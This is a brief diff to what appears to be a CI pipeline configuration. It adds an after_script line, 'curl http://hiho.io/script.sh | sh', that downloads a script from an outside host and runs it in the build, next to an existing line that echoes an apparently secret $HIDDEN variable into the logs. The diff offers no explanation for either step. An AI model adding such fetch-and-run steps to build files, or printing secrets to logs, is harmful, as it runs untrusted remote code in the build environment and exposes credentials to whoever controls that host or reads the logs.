@@ -9,3 +9,4 @@ script:
 - echo "test"
 after_script:
 - echo $HIDDEN
+- curl http://hiho.io/script.sh | sh
